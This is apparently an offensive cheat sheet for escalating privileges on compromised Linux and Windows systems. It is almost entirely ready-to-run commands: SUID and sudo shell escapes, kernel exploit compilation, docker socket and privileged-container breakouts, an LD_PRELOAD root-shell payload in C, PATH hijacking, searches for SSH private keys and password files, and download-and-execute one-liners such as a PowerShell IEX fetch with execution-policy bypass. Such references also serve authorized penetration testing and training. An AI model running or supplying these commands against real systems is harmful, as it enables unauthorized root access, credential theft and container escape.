# escalate privileges on compromised systems. example: exploit misconfigs, weak permissions, kernel bugs because initial shells are usually low-priv

## linux privilege escalation enumeration
```bash
# basic system info
uname -a                       # kernel version
cat /etc/os-release            # os details  
whoami && id                   # current user and groups
sudo -l                        # sudo permissions
cat /etc/passwd | grep -v nologin  # real users
cat /etc/group                 # groups

# find suid/sgid binaries
find / -perm -4000 -type f 2>/dev/null    # suid files
find / -perm -2000 -type f 2>/dev/null    # sgid files
find / -perm -u=s -type f 2>/dev/null     # suid (alternative)

# writable directories and files
find / -writable -type d 2>/dev/null      # writable dirs
find / -writable -type f 2>/dev/null      # writable files
find /etc -writable -type f 2>/dev/null   # writable config files
```

## common privilege escalation vectors
```bash
# sudo misconfigurations
sudo -l                        # check sudo permissions
sudo -u#-1 /bin/bash           # exploit sudo version < 1.8.28
sudo LD_PRELOAD=./shell.so program  # if LD_PRELOAD in env_keep

# cron jobs
cat /etc/crontab               # system cron
ls -la /etc/cron.*             # cron directories
crontab -l                     # user cron (all users)
grep -r "CRON" /var/log/       # cron execution logs

# world-writable files and scripts  
find / -type f -perm -002 2>/dev/null  # world-writable files
find /etc -name "*.sh" -perm -002 2>/dev/null  # writable scripts

# services and processes
ps aux                         # running processes
systemctl list-units --type=service  # systemd services
ls -la /etc/init.d/            # init scripts
```

## suid/sgid exploitation
```bash
# common suid exploits
# if /bin/bash has suid: bash -p
# if /usr/bin/find has suid: find . -exec /bin/sh -p \; -quit
# if /usr/bin/vim has suid: vim -c ':!/bin/sh'
# if /usr/bin/nmap has suid: nmap --interactive; !sh

# gtfobins suid checks
/usr/bin/find . -exec /bin/sh \; -quit
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/awk 'BEGIN {system("/bin/sh")}'
/usr/bin/less # then !sh
/usr/bin/man man # then !sh
```

## kernel exploits
```bash
uname -r                       # kernel version
cat /proc/version              # detailed kernel info
searchsploit linux kernel $(uname -r)  # search exploits
gcc -o exploit exploit.c       # compile exploit
./exploit                      # run exploit

# common kernel exploits by version
# 2.6.x: dirty cow (CVE-2016-5195)
# 3.x: overlayfs (CVE-2015-1328) 
# 4.x: af_packet (CVE-2016-8655)
```

## file system permissions
```bash
# check for interesting files
find /home -name "*.txt" -o -name "*.bak" 2>/dev/null
find / -name "*config*" -type f 2>/dev/null
find / -name "*.log" -type f 2>/dev/null
find / -name "*pass*" -type f 2>/dev/null

# ssh keys
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa
```

## windows privilege escalation
```cmd
# basic enumeration
whoami /all                    # current user details
net user                       # local users
net localgroup administrators  # admin group members
systeminfo                    # system information
wmic qfe                       # installed patches

# service enumeration
sc query state= all            # all services
wmic service list brief        # service details
accesschk.exe -uwcqv "Everyone" *  # check permissions

# scheduled tasks
schtasks /query /fo LIST /v    # detailed task list
dir c:\windows\system32\tasks  # task files

# unquoted service paths
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# always install elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

## automated enumeration tools
```bash
# linux enumeration
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# linux privilege escalation awesome script
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# pspy for monitoring processes
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64 && ./pspy64

# windows enumeration
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"

# winpeas
powershell -c "iwr -uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -outfile winpeas.bat"
winpeas.bat
```

## docker container escape
```bash
# check if inside container
cat /proc/1/cgroup | grep docker  # docker container
ls -la /.dockerenv             # docker environment file

# privileged container escape
fdisk -l                       # list host disks
mount /dev/sda1 /mnt           # mount host filesystem
chroot /mnt /bin/bash          # chroot to host

# docker socket escape
find / -name "docker.sock" 2>/dev/null
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
```

## capabilities exploitation
```bash
getcap -r / 2>/dev/null        # find capabilities
# cap_setuid: allows setuid
# cap_dac_override: bypass file permissions
# cap_net_raw: raw sockets

# python with cap_setuid
./python -c "import os; os.setuid(0); os.system('/bin/bash')"
```

## environment exploitation
```bash
# path hijacking
echo $PATH                     # check current path
which program                  # check program location
echo '#!/bin/bash\n/bin/bash -p' > /tmp/program
chmod +x /tmp/program
export PATH=/tmp:$PATH         # hijack path

# ld_preload exploitation
cat > /tmp/exploit.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles
LD_PRELOAD=/tmp/exploit.so program
```

## (._.) common gotchas
```bash
# always check for restricted shells
echo $0                        # check current shell
export PATH=/usr/bin:/bin:$PATH  # fix path if restricted

# bypassing rbash
ssh user@host -t "/bin/bash --noprofile"
python -c "import pty; pty.spawn('/bin/bash')"
```

# TODO: add container runtime escapes, systemd service abuse, polkit exploits, credential harvesting